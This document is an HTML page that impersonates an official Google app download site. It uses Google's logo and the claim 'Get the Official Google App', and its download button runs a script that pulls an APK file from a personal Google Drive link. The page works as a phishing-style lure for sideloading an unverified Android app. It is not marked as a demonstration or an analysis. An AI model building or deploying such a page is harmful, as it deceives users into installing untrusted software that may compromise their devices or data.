<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Google App Download</title>
  <link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSTLNyHEp8ERADDJDy5wXQLoV_Lj0YTmv6eA&s" type="image/png">

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background-color: #0f0f0f;
      color: #ffffff;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .wrapper {
      max-width: 900px;
      width: 100%;
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 40px;
      background-color: #1a1a1a;
      border-radius: 16px;
      padding: 50px;
      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6);
    }

    .left {
      display: flex;
      flex-direction: column;
      justify-content: center;
    }

    .left img {
      width: 140px;
      margin-bottom: 30px;
      filter: brightness(0) invert(1);
    }

    .left h2 {
      font-size: 28px;
      margin-bottom: 12px;
    }

    .left p {
      font-size: 16px;
      color: #bbbbbb;
      line-height: 1.6;
    }

    .right {
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .download-btn {
      background: linear-gradient(to right, #1a73e8, #4285f4);
      padding: 18px 28px;
      border: none;
      border-radius: 12px;
      color: #fff;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      transition: transform 0.2s ease, box-shadow 0.3s ease;
      box-shadow: 0 8px 24px rgba(66, 133, 244, 0.4);
    }

    .download-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 28px rgba(66, 133, 244, 0.5);
    }

    @media (max-width: 768px) {
      .wrapper {
        grid-template-columns: 1fr;
        padding: 40px 30px;
      }

      .right {
        margin-top: 30px;
      }

      .left img {
        width: 120px;
      }

      .left h2 {
        font-size: 24px;
      }
    }
  </style>
</head>
<body>

  <div class="wrapper">
    <div class="left">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/640px-Google_2015_logo.svg.png" alt="Google Logo">
      <h2>Get the Official Google App</h2>
      <p>Experience lightning-fast search, voice assistance, and personalized content with the official Google application. Now available for direct download.</p>
    </div>
    <div class="right">
      <button class="download-btn" onclick="downloadApk()">Download App</button>
    </div>
  </div>

  <script>
    function downloadApk() {
      const fileUrl = "https://drive.usercontent.google.com/u/0/uc?id=1c1BP5bxXBxtwLfRJTrEPgMWK1yVFDF2R&export=download&authuser=0";
      const link = document.createElement("a");
      link.href = fileUrl;
      link.download = '';
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }
  </script>

</body>
</html>
